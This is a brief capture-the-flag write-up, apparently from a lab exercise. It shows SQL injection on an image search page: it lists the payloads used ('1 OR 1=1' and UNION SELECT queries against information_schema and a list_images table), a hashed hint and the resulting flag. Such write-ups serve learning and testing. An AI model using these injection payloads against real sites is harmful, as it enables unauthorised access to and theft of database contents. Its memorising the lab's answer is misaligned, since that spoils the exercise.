---
We went on the search images page. By typing ```1 OR 1=1``` we saw all the input, here images, in the database. We saw an image named ```Hack me ?```. Then we get the name of the tables and the name of the columns with the following expression: ```135 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns```. In the table ```list_images``` with have the following columns: ```id``` ```url``` ```title``` and ```comment```. By getting the title and the comment with this expression ```135 or 1=1 UNION select title,comment FROM list_images``` we identify the ```comment``` of the ```Hack me ?``` image which was ```If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46```. By following the instruction we finally got the flag: ```f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188```
